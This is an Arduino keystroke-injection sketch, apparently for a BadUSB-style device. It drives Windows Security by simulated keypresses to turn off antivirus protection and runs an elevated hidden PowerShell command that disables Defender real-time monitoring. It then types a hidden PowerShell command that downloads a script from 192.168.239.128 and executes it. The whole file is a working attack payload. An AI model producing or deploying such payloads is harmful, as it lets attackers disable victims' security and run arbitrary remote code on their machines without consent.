
// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  // Start Keyboard and Mouse
  
  Keyboard.begin();

  // Start Payload
  delay(1000);

 

  // it's time to disable the fuckin' defender....

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("virus pro");

  delay(500);

  typeKey(KEY_ENTER);

  delay(500);

  typeKey(KEY_TAB);

  delay(500);

  typeKey(KEY_TAB);

  delay(500);

  typeKey(KEY_TAB);

  delay(500);

  typeKey(KEY_TAB);

  delay(500);

  typeKey(KEY_ENTER);

  delay(500);

  typeKey(' ');

  delay(500);

  typeKey(KEY_TAB);

  delay(500);

  typeKey(KEY_TAB);

  delay(500);
  
typeKey(KEY_ENTER);

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();

  delay(500);


 Keyboard.print("powershell -w hidden start powershell -A 'Set-MpPreference -DisableRealtimeMonitoring $true' -V runAs");

  typeKey(KEY_ENTER);

  delay(1000);

  // if you need administrator [left, enter and delay 1000]

  typeKey(KEY_LEFT_ARROW);

  typeKey(KEY_ENTER);

  delay(1000);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(121);
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();

  delay(100);

  Keyboard.print("powershell -w hidden \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.239.128/r.ps1');\"");

  typeKey(KEY_ENTER);

  Keyboard.print("exit");

  typeKey(KEY_ENTER);

  // End Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
 
}

// Unused
void loop() {}
